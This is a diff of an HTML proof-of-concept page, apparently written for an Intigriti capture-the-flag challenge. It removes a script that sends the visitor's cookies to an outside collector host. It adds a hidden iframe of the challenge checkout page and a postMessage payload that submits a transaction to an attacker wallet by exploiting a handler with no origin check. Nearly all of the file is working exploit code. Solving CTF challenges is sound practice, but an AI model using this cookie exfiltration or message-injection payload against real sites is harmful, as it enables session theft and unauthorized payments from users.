@@ -1,9 +1,55 @@
-<!doctype html>
 <!DOCTYPE html>
 <html>
+<head>
+    <title>CTF PoC - postMessage Exploit</title>
+</head>
 <body>
-<script>
-fetch('https://ihjibqfpwfwdahxlnrixzz251mzwqnk07.oast.fun/?flag='+document.cookie);
-</script>
+    <h1>PostMessage Exploit PoC</h1>
+    <p>This page exploits the insecure postMessage handler.</p>
+    
+    <!-- Hidden iframe loading the vulnerable checkout page -->
+    <iframe id="victimFrame" 
+            src="https://challenge-0126.intigriti.io/checkout.html?currency=ETH&price=150" 
+            style="width: 0; height: 0; border: 0; position: absolute;"></iframe>
+
+    <script>
+        // Your wallet address from the CTF
+        const attackerWallet = '1294439e8e8f969e6e588041d46532752c';
+        
+        // Wait for iframe to load
+        document.getElementById('victimFrame').onload = function() {
+            console.log('Victim page loaded, sending malicious payload...');
+            
+            // Craft the malicious transaction
+            const maliciousTransaction = {
+                type: 'submitTransaction',
+                transaction: {
+                    currency: 'ETH',  // Must match the currency in URL
+                    amount: 100,       // Any positive amount
+                    toAddress: attackerWallet  // Your wallet address
+                }
+            };
+            
+            // Send the malicious payload to the vulnerable page
+            // Using '*' as targetOrigin bypasses all origin checks
+            document.getElementById('victimFrame').contentWindow.postMessage(
+                maliciousTransaction, 
+                '*'
+            );
+            
+            console.log('Malicious transaction sent to victim page.');
+            console.log('Payload:', JSON.stringify(maliciousTransaction, null, 2));
+        };
+        
+        // Optional: Listen for responses from the victim page
+        window.addEventListener('message', function(event) {
+            console.log('Received message from victim:', event.data);
+            
+            // If transaction was successful, you might get a response
+            if (event.data && event.data.txHash) {
+                alert('SUCCESS! Transaction Hash: ' + event.data.txHash);
+            }
+        });
+    </script>
 </body>
 </html>
